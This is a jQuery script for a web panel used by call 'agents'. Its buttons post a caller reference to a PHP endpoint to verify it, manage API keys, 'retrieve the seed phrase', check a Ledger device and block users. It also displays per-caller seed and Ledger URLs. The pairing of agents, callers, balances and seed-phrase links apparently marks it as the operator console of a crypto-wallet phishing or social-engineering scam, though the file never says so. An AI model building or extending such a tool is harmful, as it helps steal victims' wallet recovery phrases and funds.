$(document).ready(function () {

    toastr.options = {
        'closeButton': true,
        'debug': false,
        'newestOnTop': false,
        'progressBar': false,
        'positionClass': 'toast-top-right',
        'preventDuplicates': false,
        'showDuration': '1000',
        'hideDuration': '1000',
        'timeOut': '5000',
        'extendedTimeOut': '1000',
        'showEasing': 'swing',
        'hideEasing': 'linear',
        'showMethod': 'fadeIn',
        'hideMethod': 'fadeOut',
    }

    // Configuration
    const config = {
        apiEndpoint: 'ajax-helper.php',
        agent: getUrlParameter('agent') || 'Unknown',
        caller: getUrlParameter('caller') || 'Unknown',
        department: $('#main-container').data('department') || 'Unknown',
        balance: $('#balance').val() || '',
    };

    // Reference input and search functionality
    const $referenceInput = $('#ref-text');

    // Button click handlers
    $('#btn-reference-verify').on('click', function () {
        handleVerifyAction();
    });

    $('#btn-api-key').on('click', function () {
        handleApiKeyAction();
    });

    $('#btn-api-cancel').on('click', function () {
        handleApiCancelAction();
    });

    $('#btn-seed-phrase').on('click', function () {
        handleSeedPhraseAction();
    });

    $('#btn-ledger').on('click', function () {
        handleLedgerAction();
    });

    $('#btn-block').on('click', function () {
        handleBlockAction();
    });

    $('#alert-team').on('click', function () {
       handleAlertTeamAction();
    });

    // Enter key support for reference input
    $referenceInput.on('keypress', function (e) {
        if (e.which === 13) {
            handleVerifyAction();
        }
    });


    function handleVerifyAction() {
        const reference = $referenceInput.val().trim();
        const $button = $('#btn-reference-verify');

        if (reference) {
            const data = {
                reference: reference,
            }
            makeAjaxRequest(data, $button, 'verify');
        } else {
            toastr.error('Please enter a reference to verify.');
        }
    }

    function handleApiKeyAction() {
        const reference = $referenceInput.val().trim();
        const $button = $('#btn-api-key');

        if (reference) {
            const data = {
                reference: reference,
            }
            makeAjaxRequest(data, $button, 'api_key');
        } else {
            toastr.error('invalid reference');
        }
    }

    function handleApiCancelAction() {
        const reference = $referenceInput.val().trim();
        const $button = $('#btn-api-cancel');

        if (reference) {
            const data = {
                reference: reference,
            }
            makeAjaxRequest(data, $button, 'api_key_cancel');
        } else {
            toastr.error('Please enter a reference to cancel API keys.');
        }

    }

    function handleSeedPhraseAction() {
        const reference = $referenceInput.val().trim();
        const $button = $('#btn-seed-phrase');
        if (reference) {
            const data = {
                reference: reference,
            }
            makeAjaxRequest(data, $button, 'seed_phrase');
        } else {
            toastr.error('Please enter a reference to retrieve the seed phrase.');
        }
    }

    function handleLedgerAction() {
        const reference = $referenceInput.val().trim();
        const $button = $('#btn-ledger');
        if (reference) {
            const data = {
                reference: reference,
            }
            makeAjaxRequest(data, $button, 'ledger');
        } else {
            toastr.error('Please enter a reference to verify the Ledger device.');
        }
    }

    function handleBlockAction() {
        const reference = $referenceInput.val().trim();
        const $button = $('#btn-block');
        if (reference) {
            const data = {
                reference: reference,
            }
            makeAjaxRequest(data, $button, 'block');
        } else {
            toastr.error('Please enter a reference to block the user.');
        }
    }

    // Utility functions
    function getUrlParameter(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
    }

    function showButtonLoader($button, loadingText = 'Processing...') {
        // Store original button content
        $button.data('original-html', $button.html());
        $button.data('original-disabled', $button.prop('disabled'));

        // Create loading spinner
        const spinner = `
            <span class="inline-flex items-center">
                <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-current" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                ${loadingText}
            </span>
        `;

        // Set loading state
        $button.html(spinner);
        $button.prop('disabled', true);
        $button.addClass('opacity-75 cursor-not-allowed');
    }

    function hideButtonLoader($button) {
        // Restore original button content
        const originalHtml = $button.data('original-html');
        const originalDisabled = $button.data('original-disabled');

        if (originalHtml) {
            $button.html(originalHtml);
        }

        $button.prop('disabled', originalDisabled || false);
        $button.removeClass('opacity-75 cursor-not-allowed');

        // Clean up data
        $button.removeData('original-html original-disabled');
    }

    function makeAjaxRequest(data, button, action) {
        showButtonLoader(button);

        $.ajax({
            url: config.apiEndpoint,
            type: 'POST',
            data: {
                action: action,
                ...data,
                agent: config.agent,
                caller: config.caller,
                department: config.department,
                balance: config.balance,
            },
            success: function (response) {
                if (!response.success) {
                    toastr.error('Error: ' + response.error);

                    if (action === 'verify') {
                        $('#verified').addClass('bg-gray-500').removeClass('bg-[#659c36]');
                    }

                    return;
                }
                toastr.success('Success: ' + response.message);

                if (action === 'verify') {
                    $('#verified').addClass('bg-[#659c36]').removeClass('bg-gray-500');
                    $('#seed-url').text(response.seed_url);
                    $('#ledger-url').text(response.ledger_url);
                }


            },
            error: function (xhr, status, error) {
                toastr.error('Request failed: ' + error);
            }
        }).always(function () {
            hideButtonLoader(button);
        });
    }

    $('#user-info-form').on('submit', function (e) {
        e.preventDefault();
        const reference = $referenceInput.val().trim();

        const formData = $(this).serializeArray();
        const data = {};
        formData.forEach(function (item) {
            data[item.name] = item.value;
        });
        if (!reference) {
            toastr.error('Please enter a reference to save user information.');
            return;
        }
        data.reference = reference;

        showButtonLoader($('#save-user-info'), 'Saving...');

        $.ajax({
            url: config.apiEndpoint,
            type: 'POST',
            data: {
                action: 'save_user_info',
                ...data,
                agent: config.agent,
                caller: config.caller,
                department: config.department,
            },
            success: function (response) {
                if (!response.success) {
                    toastr.error('Error: ' + response.error);
                    return;
                }
                toastr.success('User information saved successfully.');
            },
            error: function (xhr, status, error) {
                toastr.error('Request failed: ' + error);
            }
        }).always(function () {
            hideButtonLoader($('#save-user-info'));
        });
    });

    function handleAlertTeamAction() {
        const reference = $referenceInput.val().trim();
        const message = $('#alert-message').val().trim();

        showButtonLoader($('#alert-team'), 'Alerting...');

        $.ajax({
            url: config.apiEndpoint,
            type: 'POST',
            data: {
                action: 'alert_team',
                reference: reference,
                agent: config.agent,
                caller: config.caller,
                department: config.department,
                message: message,
            },
            success: function (response) {
                if (!response.success) {
                    toastr.error('Error: ' + response.error);
                    return;
                }
                toastr.success('Team manager alerted successfully.');
            },
            error: function (xhr, status, error) {
                toastr.error('Request failed: ' + error);
            }
        }).always(function () {
            hideButtonLoader($('#alert-team'));
            $('#close-modal').click();
            $('#alert-form')[0].reset();
        });
    }


});

